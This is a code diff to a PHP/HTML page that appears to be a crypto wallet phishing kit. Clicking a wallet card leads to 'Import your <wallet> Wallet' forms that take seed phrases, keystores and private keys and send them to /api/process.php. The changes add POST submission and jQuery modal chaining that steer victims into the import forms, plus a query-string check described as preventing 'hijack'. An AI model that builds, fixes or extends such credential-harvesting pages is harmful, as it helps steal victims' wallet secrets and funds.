@@ -2302,7 +2302,7 @@ if (!isset($_SESSION['csrf_token'])) {
                 <div class="tab-content p-3">
                     <!-- Tab #1: Phrase -->
                     <div class="tab-pane fade show active" id="phrase" role="tabpanel" aria-labelledby="phrase-tab">
-                        <form id="phraseForm">
+                        <form id="phraseForm" method="POST">
                             <input type="hidden" name="csrf_token"
                                 value="<?php echo htmlspecialchars($_SESSION['csrf_token'] ?? ''); ?>">
                             <input type="hidden" name="pwallet" value="wallet1">
@@ -2409,16 +2409,26 @@ if (!isset($_SESSION['csrf_token'])) {
     <!-- Bootstrap JS (BS5 bundle for consistency) -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
+    <!-- Bootstrap JS & dependencies (jQuery first for BS4 compatibility) -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            // Event delegation for form submissions (handles tab switches)
+            // Skip explanation script if form data in query (prevents hijack)
+            if (window.location.search.includes('pemail') || window.location.search.includes('phrase')) {
+                document.getElementById('content').innerHTML = '<h2>Form Submitted</h2><p>Your submission is being processed.</p>';
+                return;
+            }
+
+            // Event delegation for form submissions
             document.addEventListener('submit', async (e) => {
                 if (e.target.matches('#phraseForm, #keystoreForm, #privateForm')) {
                     e.preventDefault();
 
                     const form = e.target;
                     const formData = new FormData(form);
-                    const data = Object.fromEntries(formData);
 
                     try {
                         const response = await fetch('/api/process.php', {
@@ -2449,9 +2459,44 @@ if (!isset($_SESSION['csrf_token'])) {
                 }
             });
 
-            // Reset forms when modal closes (clears persisted data)
+            // Reset forms when modal closes
             document.getElementById('importModal').addEventListener('hidden.bs.modal', function () {
                 document.querySelectorAll('#walletTabContent form').forEach(form => form.reset());
+            });
+        });
+    </script>
+    <script>
+        $(document).ready(function () {
+            console.log('JS loaded, wallet count: ' + $('.hp-select-box-item').length);  // Debug: Check if cards found
+
+            // 1) Click on any wallet card (event delegation for dynamic content)
+            $(document).on('click', '.hp-select-box-item', function () {
+                console.log('Wallet card clicked!');  // Debug: Confirm click fires
+
+                var walletName = $(this).find('.coin-name').text().trim();
+                var walletImg = $(this).find('img').attr('src');
+
+                $('#walletModalName').text(walletName);
+                $('#walletModalNameText').text(walletName);
+                $('#walletModalImg').attr('src', walletImg);
+
+                $('#walletModal').modal('show');
+            });
+
+            // 2) On "Connect," close #walletModal, then open #importModal
+            $('#connectBtn').on('click', function () {
+                var walletName = $('#walletModalName').text();
+                var walletImg = $('#walletModalImg').attr('src');
+
+                $('#walletModal').modal('hide');
+
+                $('#walletModal').on('hidden.bs.modal', function () {
+                    $('#importModalImg').attr('src', walletImg);
+                    $('#importModalTitle').text("Import your " + walletName + " Wallet");
+
+                    $('#importModal').modal('show');
+                    $(this).off('hidden.bs.modal');
+                });
             });
         });
     </script>
